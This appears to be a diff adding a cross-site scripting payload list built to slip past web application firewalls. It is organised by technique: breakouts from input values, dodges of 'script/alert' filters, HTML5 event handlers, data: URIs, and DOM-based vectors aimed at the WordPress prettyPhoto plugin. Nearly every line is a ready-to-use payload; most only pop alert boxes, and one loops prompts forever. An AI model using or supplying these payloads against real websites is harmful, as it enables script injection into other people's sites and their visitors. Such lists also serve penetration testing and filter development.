@@ -1,0 +1,88 @@
+/*These vectors will help to circumvent some of the limitations in the bypass WAF*/
+/*All designs have been collected by me from different sources! special thanks to all the researchers XSSposed archive*/
+					
+<svg><x><script>alert&#40;1&#41</x>
+<svg><x><script>alert&#40;&#39;1&#39;&#41</x>
+<svg onload=window.onerror=alert;throw/1/;//"/>
+<img src=x onerror=while(true){prompt(1)}>
+<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<svg id=javascript:alert(1) onload=location=id>
+<svg id=alert(1) onload=eval(id)>
+<img src=x:alert(alt) onerror=eval(src) alt=xwx>
+<body/onpageshow=(alert)(1)>
+<svg id=alert(1) onload=eval(id)>
+<svg onload=(alert)(1) >
+<frameset onload=alert(1)> 
+                                                       
+/*To bypass input values*/
+
+"autofocus/onfocus="alert &#40/1&#41
+onfocus=onfocus=\u0061lert(1) autofocus
+autofocus onfocus=window.onerror=alert;throw/1/;//
+
+                                                       
+ 
+/*Bypass filtration "script/alert"*/
+					   
+<script>$=1,alert($)</script>
+<script ~~~>confirm(1)</script ~~~>	
+<script>$=1,\u0061lert($)</script>
+<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
+<</script/script><script ~~~>\u0061lert(1)</script ~~~>
+</style></scRipt><scRipt>alert(1)</scRipt>
+                                                      
+/*tougher policy on the html tags*/ 
+					 
+<h1 onmouseover=alert&lpar;1&rpar;>xwx
+<h1/onmouseover='\u0061lert(1)'>xwx
+<marquee/onstart=alert(1)>xwx
+<div/onmouseover='alert(1)'>xwx
+<h1/onmouseover='alert(1)'>xwx
+<h1 onmouseover='alert(1)'>xwx
+<p onmouseover='alert(1)'>xwx
+<p/onmouseover='alert(1)'>xwx
+<plaintext/onmouseover=prompt(1)>          
+		                                               
+/*Classic very popular vector*/
+					 
+<script>alert(1)</script>
+</script><img src=x onerror=alert(1);>
+</script><iframe/onload=alert(1)>
+<img src=x onerror=alert(1);>
+<style ONLOAD=prompt(1)>
+<iframe/onload=alert(1)>
+<svg/onload=prompt(1)>
+<svg onload=alert(1)>
+
+"style=background:black; onmouseover=alert(1)"
+"autofocus/onfocus="alert(1)
+"onmouseover="alert(1);"
+"/onmouseover= alert(1)>
+"onload="alert(1)""
+                                                        
+															
+/*HTML5 popular vectors*/
+					 
+<video/poster/onerror=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<video onerror="javascript:alert(1)"><source>
+<audio onerror="javascript:alert(1)"><source>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<form><button formaction="javascript:alert(1)">		 
+					 
+					 
+/*data:text*/
+data:text/plain,alert('xwx')
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+/*Bonus Dom Based Xss wector for popular WordPress plugin Prettyphoto*/
+					 
+#!prettyPhoto/2,<a onclick="alert(1);">/		                /*firefox*/			 
+#prettyPhoto[gallery]/1,<a onclick="alert(1);">/                  /*firefox*/
+#prettyPhoto[rmsg0d]/2,<img src=x onerror=alert(1)>/	/*firefox*/	
+	
+#prettyphoto[pp_gal]/2,<img src=1 onerror=alert(1)>	       /*Only Google chrome*/
